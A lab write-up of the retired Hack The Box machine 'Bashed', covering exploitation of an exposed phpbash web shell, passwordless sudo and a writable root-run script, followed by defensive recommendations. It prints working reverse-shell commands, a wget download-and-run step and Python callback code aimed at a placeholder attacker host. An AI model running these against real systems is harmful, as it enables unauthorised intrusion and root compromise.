---
title: "Bashed — Exposed Web Shell and Root-Scheduled Script Abuse"
description: "Web enumeration exposes an interactive phpbash shell for www-data command execution, then a passwordless sudo transition and a writable root-scheduled script yield root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - privilege-escalation
objective: "Move from an unauthenticated web foothold to root by abusing an exposed development web shell, a permissive sudo delegation, and a script that root executes on a schedule."
tools:
  - rustscan
  - nmap
  - feroxbuster
  - wget
  - netcat
  - python3
  - sudo
skill: "Linux web foothold and privilege escalation via delegated sudo and writable scheduled scripts"
outcome: "www-data command execution, a passwordless sudo transition to scriptmanager, and a root context via a writable root-executed script"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Ubuntu Linux; Apache httpd 2.4.18 |
| Starting position | Unauthenticated network access |
| Objective | Unauthenticated web foothold to root via an exposed web shell, permissive sudo, and a root-run scheduled script |
| Outcome | Command execution as `www-data`; root context via a writable, root-executed script |

## From exposed phpbash to scheduled-script root

Bashed is an Easy Hack The Box Linux lab in which web enumeration exposes `phpbash`, an interactive PHP shell left in the document root, which gives command execution as `www-data`. Privilege escalation follows two documented steps: a permit-any passwordless `sudo` rule to the `scriptmanager` account, and a Python script in `/scripts` that `scriptmanager` can overwrite but root runs on a schedule. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** `Apache enumeration → exposed phpbash web shell → www-data command execution → hosted-script reverse shell → passwordless sudo to scriptmanager → writable root-scheduled script → root`

## Target, development host, and objective

- **Target:** an Ubuntu Linux host exposing a single web service, Apache httpd 2.4.18.
- **Starting position:** unauthenticated network access.
- **Objective:** turn an exposed web development artifact into a stable shell, then follow local authorization and scheduled-execution clues to root.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: web shell to writable scheduled script

### 1. Service Enumeration

Observation: a full-port scan exposes a single HTTP service.

```bash
rustscan -a <TARGET_HOST> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_FILE>
```

Truncated scan output:

```text
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: <LAB_USER>'s Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Significance: HTTP is the only reachable service, and the site title advertises a development site, so the web application is the entire external attack surface. The banner identifies the platform build.

Result: Apache on port 80 is the only exposed service.

### 2. Web Content Discovery

Observation: directory enumeration reveals a development directory holding PHP shell files.

```bash
feroxbuster --url http://<TARGET_HOST> --wordlist <WEB_CONTENT_WORDLIST>
```

Truncated discovery output:

```text
/uploads
/dev
```

The `/dev` path contains:

```text
phpbash.min.php
phpbash.php
```

Significance: a browsable directory containing an interactive PHP shell converts a content-discovery finding into a ready-made web command channel, and the shell file was reachable without authentication.

Result: an interactive shell file is reachable under the web root.

### 3. Web Shell Command Execution

Observation: browsing `/dev/phpbash.php` serves an interactive browser-based shell that runs commands as the web server account.

Representative interaction:

```bash
www-data@bashed:/var/www/html/dev# whoami
www-data
```

Significance: the shell executes arbitrary commands in the context of `www-data`, the Apache service account, which gives unauthenticated code execution on the host.

Result: command execution as `www-data` is established.

### 4. Shell Stabilization

Observation: the browser shell is unsuitable for sustained interactive work, and I tried direct reverse-shell one-liners launched from it that proved unreliable.

Action: host a small shell script on the attacker host, download it to a temporary path on the target, and execute it to receive a reverse shell.

On the attacker:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_HOST>/<REVSHELL_PORT> 0>&1' > bashell.sh
python3 -m http.server 80
nc -nlvp <REVSHELL_PORT>
```

On the target, through the web shell:

```bash
wget http://<ATTACKER_HOST>/bashell.sh -O /tmp/revshell.sh
bash /tmp/revshell.sh
```

The shell returns:

```text
www-data@bashed:/var/www/html/dev$
```

Significance: moving from a browser-based shell to a network shell yields a stable, scriptable session, which the recorded approach preferred over a direct one-liner.

Result: an interactive network shell as `www-data` is obtained.

### 5. Sudo Enumeration and Identity Transition

Observation: local `sudo` enumeration shows the web-service account may run any command as the script-management account without a password.

```bash
sudo -l
```

```text
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Action: switch to the permitted account:

```bash
sudo -u scriptmanager /bin/bash
```

Significance: an unrestricted delegation rule grants full command execution as `scriptmanager`, which can reach files the web-service account cannot. The transition's own prompt is not recorded; the permission grant is shown, and the next stage runs in the script-management context.

Result: control moves to the `scriptmanager` account.

### 6. Writable Scheduled Script to Root

Observation: `/scripts` holds a Python script owned by `scriptmanager` beside an output file owned by root that is rewritten repeatedly, evidence that root executes the script on a schedule.

```bash
ls -la /scripts
```

```text
-rw-r--r-- 1 scriptmanager scriptmanager 58 test.py
-rw-r--r-- 1 root          root          12 test.txt
```

Action: replace the writable script with callback logic and catch the root execution:

```python
# /scripts/test.py (replaced by scriptmanager)
import os
import socket
import subprocess

HOST = "<ATTACKER_HOST>"
PORT = <ROOT_CALLBACK_PORT>

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)

subprocess.call(["/bin/sh", "-i"])
```

```bash
nc -nlvp <ROOT_CALLBACK_PORT>
```

After the scheduled task runs:

```text
# whoami
root
```

Significance: root executes a script that a lower-privileged account can overwrite, so whatever is written into `test.py` runs with root privileges, a direct privilege-boundary failure.

Result: the callback returns as root, confirmed by `whoami`.

## One decision: stage a script over direct one-liners

| Challenge | Decision | Rationale |
|---|---|---|
| Direct reverse-shell one-liners from the browser web shell were unreliable | Hosted a small shell script and executed it from a temporary location | A staged scripted payload was the recorded, more reliable path |

## Outcome: www-data to root via a scheduled script

The source records a root context after overwriting a script that root executes on a schedule. One limit remains: the scheduler configuration itself is not captured, so root execution is inferred from the script/output ownership mismatch and the repeatedly rewritten root-owned output.

## Recommendations: web shell, sudo delegation, and writable script

The following actions are recommendations. No validation is documented.

1. **Development shell left in the web root.** `phpbash.php` was reachable without authentication and gave code execution as `www-data`. *Recommendation:* remove administrative and diagnostic tooling from web-accessible directories and deploy only required application files. *Detection:* scan for shell-like files and flag requests that execute them.
2. **Overly permissive sudo delegation.** A `NOPASSWD: ALL` rule let the web-service account run arbitrary commands as `scriptmanager`. *Recommendation:* scope `sudoers` to specific binaries and arguments instead of unrestricted command execution as another account. *Detection:* review `sudo -l` output and audit `sudoers` for blanket `NOPASSWD: ALL` grants.
3. **Root-executed script writable by a lower-privileged account.** `scriptmanager` could overwrite `test.py`, which root ran on a schedule; the overwrite yielded root code execution. *Recommendation:* keep privileged scheduled scripts and their directories writable only by root, and run non-root schedulers without privilege. *Detection:* monitor scheduled-task scripts and directories for unexpected content changes.

## References

- [Hack The Box — Bashed](https://app.hackthebox.com/machines/Bashed) (retired machine)
- [RustScan](https://github.com/RustScan/RustScan)
- [feroxbuster](https://github.com/epi052/feroxbuster)
- [phpbash](https://github.com/Arrexel/phpbash)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Apache HTTP Server 2.4 Documentation](https://httpd.apache.org/docs/2.4/)
